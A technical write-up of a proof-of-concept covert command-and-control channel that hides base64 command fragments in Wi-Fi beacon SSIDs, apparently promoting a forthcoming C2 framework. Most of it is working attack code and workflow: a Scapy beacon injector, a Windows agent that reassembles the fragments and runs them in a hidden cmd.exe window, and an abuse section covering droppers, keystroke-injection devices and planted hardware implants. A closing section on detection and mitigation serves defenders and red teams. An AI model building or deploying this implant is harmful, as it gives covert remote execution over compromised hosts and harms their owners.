# Covert Wi-Fi C2 Using Beacon SSIDs

This write-up documents a proof-of-concept command channel that uses **Wi-Fi beacon SSID fields** as a unidirectional C2 transport:

> **Project Context:** This technique is a modular component of the next-generation **Audix C2 Framework**, currently under development and scheduled for release in **Q1 2026**.
> [Learn more about the Audix C2](https://www.security-auditing.com/C2)

- **Server (Python / Kali, monitor mode):**  
  Continuously injects beacon frames where the **SSID field is actually a command fragment**.
- **Agent (Windows / WLAN API):**  
  Periodically scans for nearby Wi-Fi networks, parses SSIDs matching a specific format, reassembles the command, and executes it **silently**.

No association to any access point is required on the target. A powered-on machine with a Wi-Fi card is sufficient.

---

## 1. High-Level Concept

**Goal:**  
Use **802.11 beacon frames** as an *air-gap-style* trigger channel for remote code execution:

- The Python script on Kali crafts fake beacons with SSIDs of the form:

  ```text
  RX:<AGENT_ID>:<JOB_ID>:<INDEX>/<TOTAL>:<DATA>
  ```

- `<DATA>` is a **base64 fragment** of the command to execute.
- Beacons are broadcast on a chosen **Wi-Fi channel** in a tight loop.
- On Windows, the agent uses the **WLAN API** to scan BSS entries, reads SSIDs, and:
  - Filters for the right **TAG** (`RX:`) and **Agent ID**.
  - Reassembles all fragments belonging to a given **Job ID**.
  - Base64-decodes the full payload to get the command.
  - Executes it using `cmd.exe /c` in a **hidden window**.

This creates a **wireless, unidirectional C2 path** that:

- Does **not** rely on TCP/IP connectivity from victim to attacker.
- Requires only **physical RF proximity** (practical range scaled via antennas).
- Works even when the host is not associated to any network (as long as the Wi-Fi NIC and WLAN service are active).

---

## 2. Over-The-Air Protocol & Frame Format

### 2.1 SSID Payload Format

All command fragments are encoded into the beacon SSID using the following format:

```text
TAG:AGENT_ID:JOB_ID:INDEX/TOTAL:CHUNK
```

With your current implementation:

- `TAG` is fixed:  
  ```text
  "RX"
  ```
- `AGENT_ID`: up to 5 chars (e.g. `AGT01`), supplied at runtime.
- `JOB_ID`: 4-char hex used to group fragments for a single command (e.g. `3AF2`).
- `INDEX/TOTAL`: 1-based chunk index and total chunks for this job (e.g. `1/9`).
- `CHUNK`: substring of the **base64-encoded command**.

Example payload for chunk 1 of 9:

```text
RX:AGT01:3AF2:1/9:Q21kUGFydA
```

SSID length limit is constrained to 32 bytes by the standard, so the Python script enforces:

- `chunk_size = 10`, and
- A hard check:

  ```python
  if len(payload) > 32:
      print(f"[!] ERROR: Payload too long ({len(payload)}). Reduce ID or Chunk Size.")
      sys.exit(1)
  ```

### 2.2 Fragmentation & Reassembly

On the sender side:

1. **Base64-encode** the command:

   ```python
   encoded_bytes = base64.b64encode(full_command.encode('utf-8'))
   encoded_cmd = encoded_bytes.decode('utf-8')
   ```

2. **Chunk** the base64 string:

   ```python
   chunk_size = 10
   total_chunks = math.ceil(len(encoded_cmd) / chunk_size)
   ```

3. For each chunk `i`:

   ```python
   index = i + 1              # 1-based
   payload = f"{TAG}:{target_id}:{job_id}:{index}/{total_chunks}:{chunk}"
   ```

On the agent side:

- Each fragment is stored in:

  ```cpp
  std::map<std::string, std::map<int, std::string>> job_buffers;
  std::map<std::string, int> job_totals;
  ```

- When `job_buffers[job_id].size() == job_totals[job_id]`, the agent concatenates all fragments in order:

  ```cpp
  std::string full_b64 = "";
  for (int i = 1; i <= job_totals[j_id]; i++)
      full_b64 += it->second[i];
  ```

- Decodes via `CryptStringToBinaryA` and passes the resulting string to the command runner.

---

## 3. Sender (Kali / Python / Scapy) Walkthrough

### 3.1 Core Behavior

Key parameters:

```python
INTERFACE = "wlan0mon"  # monitor-mode interface
TAG = "RX"
```

#### Frame Crafting

Each frame:

- Uses a **unique BSSID** per fragment to avoid collisions:

  ```python
  unique_mac = f"00:11:22:33:44:{index:02x}"
  ```

- 802.11 stack (simplified):

  ```python
  dot11 = Dot11(
      type=0, subtype=8,          # Management, Beacon
      addr1='ff:ff:ff:ff:ff:ff',  # Broadcast
      addr2=unique_mac,
      addr3=unique_mac
  )

  beacon = Dot11Beacon(cap='ESS+privacy')
  essid = Dot11Elt(ID='SSID', info=payload, len=len(payload))
  rates = Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')
  channel_ie = Dot11Elt(ID='DSset', info=struct.pack("B", int(channel)))

  frame = RadioTap()/dot11/beacon/essid/rates/channel_ie
  ```

- Transmission loop:

  ```python
  sendp(frame, iface=INTERFACE, verbose=0, count=20)
  ```

  repeated for each fragment, in an infinite loop until interrupted.

### 3.2 Infinite Broadcast Logic

`transmit()`:

1. Sets the RF channel:

   ```python
   os.system(f"iwconfig {INTERFACE} channel {channel}")
   ```

2. Prompts for commands:

   ```python
   cmd = input(f"\n[Target: {target_id}] Enter command (or 'exit', 'change'): ")
   ```

3. Builds frames via `craft_frames(cmd, target_id, job_id, channel)`.
4. Repeatedly sends all frames in a loop until `Ctrl+C`, so the agent has many chances to capture all fragments during its periodic scans.

---

## 4. Agent (Windows / WLAN API) Walkthrough

### 4.1 WLAN Enumeration & Scanning

The agent uses the native WLAN APIs:

- `WlanOpenHandle`
- `WlanEnumInterfaces`
- `WlanScan`
- `WlanGetNetworkBssList`

Core loop (simplified):

```cpp
WlanScan(hClient, &pInterfaceGuid, NULL, NULL, NULL);
Sleep(4000);  // allow scan to complete

PWLAN_BSS_LIST pBssList = NULL;
if (WlanGetNetworkBssList(...) == ERROR_SUCCESS) {
    for (unsigned int i = 0; i < pBssList->dwNumberOfItems; i++) {
        char ssidBuffer[33] = { 0 };
        memcpy(ssidBuffer,
               pBssList->wlanBssEntries[i].dot11Ssid.ucSSID,
               pBssList->wlanBssEntries[i].dot11Ssid.uSSIDLength);

        std::string ssid(ssidBuffer);
        CommandFragment frag;
        if (ParseSSID(ssid, my_agent_id, frag)) {
            // store fragment
        }
    }
}
```

### 4.2 SSID Parsing & Filtering

`ParseSSID` enforces the protocol structure and filters on agent ID:

```cpp
// Protocol: RX:AGENT_ID:JOB_ID:INDEX/TOTAL:DATA
if (ssid.find(TAG) != 0) return false;

size_t id_start = 3; // "RX:"
size_t id_end   = ssid.find(':', id_start);
frag.agent_id   = ssid.substr(id_start, id_end - id_start);

// Drop if it's not for this agent
if (frag.agent_id != my_id) return false;
```

Next:

- Extracts `JOB_ID`, `INDEX`, `TOTAL`, and `DATA` using `find(':')`, `find('/')`, and `substr`.
- Converts `INDEX` and `TOTAL` with `std::stoi`.

### 4.3 Job Tracking & De-Duplication

- `job_history` tracks completed jobs to avoid re-execution:

  ```cpp
  std::vector<std::string> job_history;
  ```

- Before storing a fragment, the job ID is checked:

  ```cpp
  bool already_done = false;
  for (const auto& done_job : job_history)
      if (done_job == frag.job_id) already_done = true;
  if (already_done) continue;
  ```

- `job_buffers[job_id][index] = frag.data;`
- `job_totals[job_id] = frag.total;`

Once all fragments are present, the job is:

1. Assembled.
2. Base64-decoded.
3. Executed.
4. Added to `job_history`.
5. Removed from `job_buffers`.

### 4.4 Command Execution (Hidden)

`RunSilent(cmd)`:

```cpp
STARTUPINFOA si;
PROCESS_INFORMATION pi;
ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
si.dwFlags = STARTF_USESHOWWINDOW;
si.wShowWindow = SW_HIDE;  // hides the console window

ZeroMemory(&pi, sizeof(pi));

// cmd.exe /c <payload>
std::string full_cmd = "cmd.exe /c " + cmd;

CreateProcessA(
    NULL,
    (LPSTR)full_cmd.c_str(),
    NULL, NULL,
    FALSE,
    0,
    NULL, NULL,
    &si,
    &pi
);
```

This gives:

- Arbitrary command execution.
- No interactive console window on the desktop.

---

## 5. Usage / Workflow (Lab & Physical Engagements)

### 5.1 Requirements

**Attacker / Operator:**

- Kali Linux (or similar) with:
  - A Wi-Fi card that supports **monitor mode** and injection.
  - `scapy` and `iwconfig` installed.
- Ability to get near the target environment (building / office / parking).

**Target Host:**

- Windows machine or laptop.
- Wi-Fi card present and enabled.
- WLAN AutoConfig/WLAN service active.
- The agent binary installed (via physical access or initial compromise).

### 5.2 Prepare Monitor Mode (Kali)

Example (interface names may vary):

```bash
# Identify interface
ip link show
# Enable monitor mode
sudo airmon-ng start wlan0
# Will typically create wlan0mon
```

Ensure `INTERFACE` in the Python script matches:

```python
INTERFACE = "wlan0mon"
```

### 5.3 Launch the Agent (Windows)

On the victim/target:

```powershell
agent.exe AGT01
```

Sample output:

```text
[*] Agent Online. Identity: AGT01
[*] Scanning all channels (OS Managed)...
............................
```

The dots (`.`) are heartbeats as it scans periodically.

### 5.4 Send Commands From the Wi-Fi C2 Sender

On Kali:

```bash
python3 wifi_c2_sender.py
```

Example session:

```text
--- Wi-Fi C2 Sender (Infinite Mode) ---
Set Target Agent ID (Max 5 chars): AGT01
Set Wi-Fi Channel (1-11): 6

[Target: AGT01] Enter command (or 'exit', 'change'): whoami
[*] Job: 3AF2 | Frames: 2
[*] Broadcasting INDEFINITELY. Press Ctrl+C when Agent executes.
```

- The script:
  - Sets the interface to channel 6.
  - Generates a random Job ID (`3AF2`).
  - Splits `whoami` (base64) into chunks.
  - Loops, injecting beacons.

On the agent side, once all fragments are seen:

```text
[+] Job 3AF2 Triggered!
[+] Executing: whoami
```

The command is executed silently via `cmd.exe /c whoami`.

---

## 6. Abuse Potential & Threat Model

This technique can be abused in several ways, particularly in **physical / close-access operations**.

### 6.1 Initial Access Vectors

An attacker (or red team) still needs to install the agent:

- **Phishing / Malware Dropper**
  - Malicious document or installer drops the agent binary and persists it.
- **USB / Rubber Ducky**
  - HID devices inject keystrokes to download and run the agent.
- **Physical On-Site**
  - Short access to a workstation (e.g. unlocked machine, conference room) to plant the agent.

Once the agent is resident, **subsequent control is RF-only**.

### 6.2 RF / Physical Proximity

Key properties:

- No need for:
  - Corporate VPN,
  - Internet access,
  - Layer-3/4 connectivity from victim to attacker.
- Only requirement: the device must periodically **scan Wi-Fi networks** (which many Windows clients do by default).

With:

- **Directional antennas** / high-gain equipment, a threat actor could:
  - Operate from a parking lot.
  - Operate from a nearby building / hotel.
  - Achieve hundreds of meters to ~1 km+ depending on gear and environment.

### 6.3 Embedded / “Pineapple-Style” Implants

Instead of a laptop:

- An attacker can walk in with a **covert dedicated hardware implant**, for example:
  - A small Wi-Fi appliance (Pineapple-like, pager-style, or custom board).
- This device:
  - Runs the Python sender or custom firmware.
  - Injects beacons with command fragments.
- The operator then:
  - Leaves the device in a strategic location (ceiling, office, closet).
  - Controls it later from outside using a separate RF link or pre-programmed schedule.

This enables **in-building C2** via beacons, with minimal footprint on traditional network monitoring.

### 6.4 No Association Required

Important:

- The victim machine **does not need to associate** to any of these fake SSIDs.
- The channel uses **passive scanning**:
  - Beacons are received during normal SSID discovery.
  - The agent reads SSIDs from `WlanGetNetworkBssList` only.

This makes the traffic **invisible to network infrastructure** (no ARP, DNS, HTTP, etc.) and almost entirely visible only at the RF layer.

---

## 7. Detection & Mitigation Considerations

From a blue-team / defensive perspective:

- **Host-based:**
  - Detect unusual use of the WLAN API in non-Wi-Fi management processes.
  - Monitor for untrusted binaries that:
    - Frequently scan for BSS lists.
    - Execute `cmd.exe /c` with arbitrary strings.
  - Use application allow-listing (e.g., WDAC, AppLocker) to prevent arbitrary agents from running.

- **Network / RF-based:**
  - Use **wireless IDS/IPS**:
    - Look for beacons with **non-human-readable SSIDs** matching structured patterns (e.g., `RX:<id>:<id>:<idx>/<tot>:<base64>`).
    - Anomalous BSSID patterns (e.g. many SSIDs with similar OUI but incrementing last byte).
  - Conduct periodic RF sweeps around sensitive buildings.

- **Hardening endpoints:**
  - Disable Wi-Fi on systems that do not require it (especially “air-gapped” assets).
  - Restrict physical access and enforce device control policies.

In **MITRE ATT&CK** terms, this PoC demonstrates:

- **T1105 – Ingress Tool Transfer** / **T1102 – Web Service (adapted)** style C2, but over **Wi-Fi management frames** instead of traditional protocols.
- **T1090 – Proxy / C2 Channel**, using a non-standard transport (beacon SSIDs).

---

## 8. Summary

This PoC shows how:

- **802.11 beacons + SSID fields** can be repurposed into a covert command delivery mechanism.
- A **small Windows agent** using standard WLAN API calls can reconstruct and execute commands encoded into SSIDs.
- Physical proximity plus a **Wi-Fi card** is enough to control a compromised host without any “normal” network connectivity.

The technique is highly relevant for:

- **Red teams** simulating advanced close-access operations.
- **Defenders** building RF-aware threat models and detection strategies around abuse of Wi-Fi management frames.
